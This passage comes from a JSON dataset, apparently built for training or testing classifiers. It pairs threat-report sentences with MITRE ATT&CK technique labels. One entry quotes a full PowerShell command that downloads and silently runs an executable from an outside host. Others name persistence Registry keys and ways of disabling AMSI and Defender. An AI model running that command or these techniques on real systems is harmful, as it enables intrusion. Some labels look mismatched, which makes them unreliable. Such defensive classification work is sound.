    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "collected the system volume serial number GUID and computer name.(Citation: PTSecurity Higaisa 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "removing files from the system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has executed commands via cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "enter this directly in the host OS command shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "lists the directories for Desktop program files and the users recently accessed files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to delete downloaded files from a compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "make use of  the curl utility to download Qakbot and then execute it.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "searches for files created within a certain timeframe and whose file extension matches a predefined list.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "RDP into the target host",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "uses the ipconfig /all command to gather the victims IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can use  to collect a list of running tasks.(Citation: Symantec Dragonfly)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has modified the registry key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System and added the ransom note. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for C2.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the `curl` command to send credentials over HTTP and the `curl` and `wget` commands to download new software.(Citation: Intezer TeamTNT September 2020)(Citation: Cado Security TeamTNT Worm August 2020)(Citation: Cisco Talos Intelligence Group)  has also used a custom user agent HTTP header in shell scripts.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "performing antivirus tampering",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "gather information on an infected host, and send details back to the attackers.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "on the API calls QueryPerformanceFrequency and QueryPerformanceCounter",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can search a list of running processes for Tr.exe.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the domain of the compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors had the clear text credentials for one of the domain administrator accounts and began moving lateral to other systems",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "deletes its payload along with the payload's parent process after it finishes copying files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can collect the victim's MAC address by using the GetAdaptersInfo API.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "As a result of all these steps, the last-stage Trojan is injected into svchost.exe’s process memory",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP in C2 communications.(Citation: CISA SoreFang July 2016)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe to execute commands on a victim's machine.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used WMI to install malware on targeted systems.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "then iterates over each volume to find files",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can load additional drivers and files onto a victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has a tool that can delete files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can download files and additional malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTPS for command and control.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Mimikatz publicly available code (top); strings from a Mimikatz modification",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors conducted a file listing discovery against multiple hosts to ensure locker encryption was successful.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "is capable of file deletion along with other file system interaction.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "then launched by cmd.exe",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "custom crypter CryptOne leveraged the VirtualAlloc() API function to help execute the payload.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can copy files and Registry data from compromised hosts.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can inject its modules into various processes using reflective DLL loading.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "the payload downloaded by the PowerShell script was a .NET downloader, which would subsequently retrieve an encrypted payload from the command-and-control (C&C) server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "malware has used Registry Run keys to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used the GetAdaptersInfo() API call to get the victim's MAC address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has sent data to its C2 server via POST requests.(Citation: CISA AppleJeus Feb 2021)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can execute arbitrary commands and utilize the ComSpec environment variable.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used the find command to search for specific files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can collect the local MAC address using `GetAdaptersInfo` as well as the system's IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can run on a daily basis using a scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "installs VNC server software that executes through rundll32.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "its installation as a service was used in order to persist and create a backdoor to the network.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "a single Rundll32.exe process",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "collects various information via WMI requests including CPU information in the Win32_Processor entry (Processor ID Name Manufacturer and the clock speed).",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "to load an assembly into an unmanaged process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has full control of the Registry including the ability to modify it.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional scripts malware and tools onto a compromised host.(Citation: Crowdstrike Indrik November 2018)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collected and exfiltrated files from the infected system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has identified the OS product name from a compromised host by searching the registry for `SOFTWARE\\MICROSOFT\\Windows NT\\ CurrentVersion | ProductName`.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can collect the IP address of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32 to execute malicious payloads on a compromised host.(Citation: McAfee Lazarus Jul 2020)(Citation: ESET Lazarus Jun 2020)",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "full command line argument",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The following file extensions of interest, specific to media, documents, emails, and certificates,",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can collect local files from the system . ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for C2 connections. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can obtain a list of running processes on the victims machine.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Download and run",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It also drops and installs",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This beacon was then successfully executed via WMI",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "injects into the svchost.exe process.(Citation: S2 Grupo TrickBot June 2017)(Citation: Trend Micro Totbrick Oct 2016)(Citation: Microsoft Totbrick Oct 2017)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to inject its fourth stage into a suspended process created by the legitimate Windows utility `InstallUtil.exe`.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can obtain network information including DNS IP and proxies.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "identifies the macOS version and uses ioreg to determine serial number.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "used UltraVNC to download an in-memory dropper",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Creates registry key for persistence only",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can use a batch script to delete itself.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can execute `cmd` commands on a compromised host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "create a scheduled task",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can use run keys and create link files in the startup folder for persistence.(Citation: IBM Grandoreiro April 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can create a scheduled task for persistence.(Citation: Cybereason Bazar July 2020)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can parse collected files to identify specific file extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The overwritten instruction (displayed in Figure 1) is used to call the “WinExec” function from kernel32.dll, as depicted in the instruction at 00430c12, which calls the “WinExec” function",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the host volume ID and the OS architecture on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can obtain a list of directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can identify the IP address and user domain on the target machine.(Citation: PWC WellMess July 2020)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute a second-stage payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "download of a batch (.bat) file.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses a batch file to kill a security program task and then attempts to remove itself.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has a command to retrieve metadata for files on disk as well as a command to list the current working directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to upload files from a targeted system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can uninstall malware components using a batch script.  can execute commands using a shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to communicate over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "may store RC4 encrypted configuration information in the Windows Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to lure victims into opening malicious attachments delivered via spearphishing.(Citation: Cisco Talos Bitter Bangladesh May 2022)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Add the process to a startup registry key",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "s data wiper component enumerates specific files on all the Windows drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to delete a specified file.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Registry Editor",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Try to disable Windows Defender service “WinDefend”",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "collects the username from the victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the OS version and computer name on a targeted system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.(Citation: Fidelis Turbo)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the hostname computer name Windows version processor speed machine GUID and disk information on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "creates scheduled tasks to establish persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "“BfeOnServiceStartTypeChange” WMI\nQuery Language (WQL) filter condition\nThe BfeOnServiceStartTypeChange Filter was\nbound to the CommandLineEventConsumer WindowsParentalControlsMigration.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "collected complete contents of the 'Pictures' folder from compromised Windows systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used various strains of malware to query the Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can perform WMI commands on the system.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "When we analyzed the email headers, we determined that the email was sent from an SMTP server using an IP associated with the Yonsei University network",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "waits for data collection tasks to complete,",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "lists local users and session information.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can collect system information including computer name system manufacturer IsDebuggerPresent state and execution path.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "perform WMI queries",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "file stealer",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Figure 1 Article referenced by decoy document in attack against British government agency The attached document leverages a DDE exploit to ultimately execute the following code:c:\\\\windows\\\\system32\\\\cmd.exe \"/k PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noprofile -command (New-Object System.Net.WebClient).DownloadFile('https://881.000webhostapp[.]com/0_31.doc', '%TEMP%\\\\AAA.exe');Start-Process('%TEMP%\\\\AAA.exe')Palo Alto Networks first witnessed this DDE exploit technique in May 2017, and attackers continue to leverage it",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "wmiexec module can be used to execute commands through WMI.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "lists processes running on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "actors often use RDP to move laterally across the network",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can communicate over HTTP or via its “normal protocol”.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "droppers have used WMI classes to execute  commands.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can gain persistence by a creating a shortcut in the infected user's Startup directory.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has relied on users mounting and executing a malicious DMG file.(Citation: Carbon Black Shlayer Feb 2019)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell one-liner that can be used to download and execute a remote .ps1 or .exe file:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can be used to find files and directories with native functionality such as dir commands.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "gathers information on the IP forwarding table MAC address configured proxy and network SSID.(Citation: ESET InvisiMole June 2018)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "is able to delete the Security Descriptor (`SD`) registry subkey in order to hide scheduled tasks.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has a command to write random data across a file and delete it.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors staged archived files in a temporary directory prior to exfiltration. ",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "collects the OS version country name MAC address computer name physical memory statistics and volume information for all drives on the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can discover the hostname computer name and Windows version of a targeted machine.(Citation: Trend Micro DRBControl February 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has executed commands using cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can gather information on the victim IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "may abuse the Windows schtasks command-line tool to create hidden scheduled tasks.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "A  malware sample performs reflective DLL injection.(Citation: McAfee Lazarus Resurfaces Feb 2018)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can query the host's Registry key at HKEY_CURRENT_USER\\Console\\QuickEdit to retrieve data.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "generated based on the computer architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "A thorough explanation of what information is collected can be found in a breakdown by Cofense from late 2018.  The script verifies all parts of the malware have been downloaded. After downloading the payload, the XSL script checks to make sure every piece of the malware was downloaded.  One of the twelve download commands as detected by the Cybereason platform in same variant of Astaroth.  The twelve downloaded files",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the attackers copy tools necessary for deployment to the compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Process Hashes and Process Privilege Checks",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used a modified version of pentesting script wmiexec.vbs which logs into a remote machine using WMI.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: Github AD-Pentest-Script)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has infected victims via malicious attachments.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used tmp files to stage gathered information.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has used Mimikatz to retrieve credentials from LSASS memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect system drive information the computer name the size of the disk OS version and OS architecture information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has a command to open the command-line on the infected system.(Citation: Threatpost Lizar May 2021) ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to delete local files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to determine if the current user is an administrator Windows product name processor name screen resolution and physical RAM of the infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Data captured by  is placed in a temporary file under a directory named memdump.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "uses a command-line interface to interact with systems.(Citation: Cobalt Strike TTPs Dec 2017)(Citation: Talos Cobalt Strike September 2020)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "One persistence mechanism used by  is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: <br>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ <br>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ <br>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run <br>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors collected data and files from compromised networks.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can remotely open applications on the infected host with the ShellExecuteA command.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Beacon payload is capable of running shell commands without cmd.exe and PowerShell commands without powershell.exe(Citation: cobaltstrike manual)(Citation: Talos Cobalt Strike September 2020)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "HDS Deletes the file created by the HD command to reverse the effect",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "creates folders to store output from batch scripts prior to sending the information to its C2 server.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.(Citation: GitHub PowerSploit May 2012)",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to upload files from an infected device.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "enumerate files and registry keys",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "may be used to enumerate the parent domain of a local machine using /parentdomain.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has deleted files using the VBA kill function.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can obtain information about the victim's IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "one to get information about the machine, such as the operating system version,",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "creates a scheduled task to establish by executing a malicious payload every subsequent minute.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "the batch file makes the following changes to the system",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can create `HKCU\\Software\\Classes\\Folder\\shell\\open\\command` as a new registry key during privilege escalation.(Citation: Uptycs Warzone UAC Bypass November 2020) ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "adds several Registry entries to enable automatic execution at every system startup.(Citation: TrendMicro DarkComet Sept 2014)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used Rundll32 to load a malicious DLL.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors also expressed interest in other access methods such as RDP",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "to download and execute a payload",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks to persist on victim systems.(Citation: FireEye APT32 May 2017)(Citation: Cybereason Oceanlotus May 2017)(Citation: Cybereason Cobalt Kitty 2017)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can gather system owner information including user and administrator privileges.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can parse the `ProxyServer` string in the Registry to discover http proxies.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used Mimikatz Windows Credential Editor and ProcDump to dump credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "disables AMSI by hijacking the COM server, changing it from \"%windir%\\system32\\amsi.dll\" to \"C:\\IDontExist.dll\".",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Legitimate processes have been corrupted by Vice Society via code injection, as a means to evade defenses.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "persists by creating a Registry entry in HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Figure 3 – A list of file extensions targeted for destruction by new variant of KillDisk component As well as being able to delete system files to make the system unbootable – functionality typical for such destructive trojans – the KillDisk variant detected in the electricity distribution companies also appears to contain some additional functionality specifically intended to sabotage industrial systems",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can perform DLL injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "uses .NET Graphics class CopyFromScreen Function()",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used tools to deploy additional payloads to compromised hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Shellcode which is used for code injection",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can collect the user name Windows version computer name and available space on discs from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can delete its executable from the AppData\\Local\\Temp directory on the compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "uses Rundll32 to load a malicious DLL.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has used tools to collect the computer name OS version installed hotfixes as well as information regarding the memory and processor on a compromised host.(Citation: ATT Sidewinder January 2021)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can search for specific files on an infected host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional Lua scripts from the C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download additional payloads onto an infected machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used LNK files to download remote files to the victim's network.(Citation: ATT Sidewinder January 2021)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "it installs itself to %programdata% and then sets the registry run key for persistence.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "to identify if privileged users are active on the systems",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Installation of malicious Windows service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "is capable of deleting files.(Citation: Fidelis njRAT June 2013)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate the infected system's user name via GetUserNameW.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "checks the running processes for evidence it may be running in a sandbox environment. It specifically enumerates processes for Wireshark and Sysinternals.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate registry keys.(Citation: ESET Sednit Part 2)",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can download and deploy additional payloads including ransomware and post-exploitation frameworks such as .(Citation: Cybereason Bazar July 2020)(Citation: Zscaler Bazar September 2020)(Citation: NCC Group Team9 June 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP requests for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "is capable of executing commands via .",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
